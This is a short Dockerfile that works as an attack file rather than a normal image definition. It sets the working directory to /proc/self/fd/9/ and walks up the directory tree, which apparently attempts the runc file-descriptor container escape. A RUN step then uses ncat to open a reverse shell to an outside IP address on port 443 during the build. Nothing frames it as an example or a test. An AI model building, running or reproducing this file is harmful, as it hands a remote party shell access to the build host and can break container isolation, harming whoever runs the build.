FROM ubuntu
RUN apt update && apt install -y curl && apt install -y ncat && apt install python3 -y
WORKDIR /proc/self/fd/9/
RUN cd ../../../../../../../../

RUN ncat 20.64.89.35 443 -e /bin/sh

CMD ["/bin/bash"]
